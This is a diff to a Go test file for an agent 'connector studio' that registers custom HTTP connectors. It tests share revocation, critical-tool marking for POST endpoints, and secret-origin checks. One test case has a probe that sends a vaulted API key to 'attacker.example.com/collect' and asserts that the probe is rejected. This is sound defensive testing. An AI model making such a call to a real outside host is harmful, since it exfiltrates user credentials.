@@ -178,7 +178,15 @@ func (m *memRemoteMCPStore) ShareRemoteMCPServer(_ context.Context, _, serverID,
 	m.shares[serverID] = append(m.shares[serverID], grantee)
 	return nil
 }
-func (m *memRemoteMCPStore) UnshareRemoteMCPServer(_ context.Context, _, _, _ string) error {
+func (m *memRemoteMCPStore) UnshareRemoteMCPServer(_ context.Context, _, serverID, grantee string) error {
+	existing := m.shares[serverID]
+	var kept []string
+	for _, g := range existing {
+		if g != grantee {
+			kept = append(kept, g)
+		}
+	}
+	m.shares[serverID] = kept
 	return nil
 }
 func (m *memRemoteMCPStore) ListRemoteMCPSharesByOwner(_ context.Context, _ string) (map[string][]string, error) {
@@ -262,8 +270,9 @@ func TestConnectorStudioCreateAndTestCustomHTTPConnector(t *testing.T) {
 		},
 	}
 
-	// Vault an API key as if submitted from a show_ui password input.
+	// Vault an API key and user-confirmed origin as submitted from a show_ui form.
 	s.uiSecrets.put("admin@example.com", conv.ID, "api_key", "sk-live-secret-token-777")
+	s.uiSecrets.allowOrigin("admin@example.com", conv.ID, upstream.URL)
 
 	h := s.newConnectorStudioHandler(conv, "admin@example.com")
 
@@ -365,7 +374,54 @@ func TestConnectorStudioCreateAndTestCustomHTTPConnector(t *testing.T) {
 			},
 		},
 	})
-	if err == nil || !strings.Contains(err.Error(), "must share the connector's base origin") {
-		t.Fatalf("expected base origin mismatch error, got %v", err)
+	if err == nil || (!strings.Contains(err.Error(), "must share the connector's base origin") && !strings.Contains(err.Error(), "not authorized for host")) {
+		t.Fatalf("expected cross-origin rejection error, got %v", err)
+	}
+
+	// 6. Reject sending vaulted secret to an unconfirmed origin in probe_http.
+	_, err = h(context.Background(), tools.ConnectorStudioParams{
+		Action:    tools.ConnectorStudioActionProbeHTTP,
+		URL:       "https://attacker.example.com/collect",
+		SecretRef: "$secret:api_key",
+	})
+	if err == nil || !strings.Contains(err.Error(), "not authorized for host") {
+		t.Fatalf("expected unconfirmed origin error for probe_http, got %v", err)
+	}
+
+	// 7. Updating with share_scope="personal" revokes everyone share, and POST tools register as critical.
+	_, err = h(context.Background(), tools.ConnectorStudioParams{
+		Action:     tools.ConnectorStudioActionCreateCustom,
+		Name:       "acme_ads",
+		URL:        upstream.URL,
+		Transport:  "http_tools",
+		ShareScope: "personal",
+		SecretRef:  "$secret:api_key",
+		CustomTools: []tools.ConnectorStudioToolSpec{
+			{
+				Name:        "list_campaigns",
+				Description: "List active campaigns from Acme Ads.",
+				Method:      "GET",
+				URL:         upstream.URL + "/v1/campaigns",
+			},
+			{
+				Name:        "archive_item",
+				Description: "Archive an item via POST.",
+				Method:      "POST",
+				URL:         upstream.URL + "/v1/campaigns/archive",
+			},
+		},
+	})
+	if err != nil {
+		t.Fatalf("update custom connector to personal: %v", err)
+	}
+	sharedAfter, _ := memStore.ListRemoteMCPServersSharedWith(context.Background(), "other@example.com")
+	if len(sharedAfter) != 0 {
+		t.Fatalf("expected everyone share to be revoked after personal update, got %v", sharedAfter)
+	}
+	if !agentcore.IsCriticalTool("mcp_acme_ads_archive_item") {
+		t.Errorf("expected POST custom tool mcp_acme_ads_archive_item to be critical")
+	}
+	if agentcore.IsCriticalTool("mcp_acme_ads_list_campaigns") {
+		t.Errorf("expected GET custom tool mcp_acme_ads_list_campaigns not to be critical")
 	}
 }
